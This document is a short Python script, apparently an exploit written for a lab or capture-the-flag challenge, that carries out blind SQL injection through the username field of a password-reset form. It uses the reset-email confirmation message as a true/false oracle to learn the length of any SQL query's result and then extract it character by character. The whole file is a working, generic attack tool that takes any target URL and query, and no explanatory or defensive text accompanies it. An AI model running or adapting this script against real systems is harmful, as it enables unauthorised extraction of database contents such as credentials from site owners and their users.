import requests
import sys


def sqli_exfiltrate(url, query):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }


    # This will define whether the query is ok or not!
    target_text = "A password reset email has been sent."

    query_length = 0
    for i in range(1, 100):
        payload = f"username=admin' and length(({query}))={i} and 1='1&reset_password=xxx"
        response = requests.post(url, data=payload, headers=headers)
        if target_text in response.text:
            query_length = i
            print(f"[*] Query result length: {query_length}")
            break
    
    if query_length == 0:
        print(f"[!] Failed to determine the query length result")
        return
    
    result = ""
    for position in range(1, query_length + 1):
        for ascii_code in range(32, 127):
            payload = f"username=admin' and ascii(substring(({query}), {position}, 1))={ascii_code} and 1='1&reset_password=xxx"
            response = requests.post(url, data=payload, headers=headers)
            if target_text in response.text:
                result += chr(ascii_code)
                print(f"Extracted so far: {result}")
                break
    print(f"[*] Extracted Query result: {result}")



if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"[!] Usage: python3 exploit.py <url> <query>")
        sys.exit(1)

    target_url = sys.argv[1]
    query = sys.argv[2]

    sqli_exfiltrate(target_url, query)
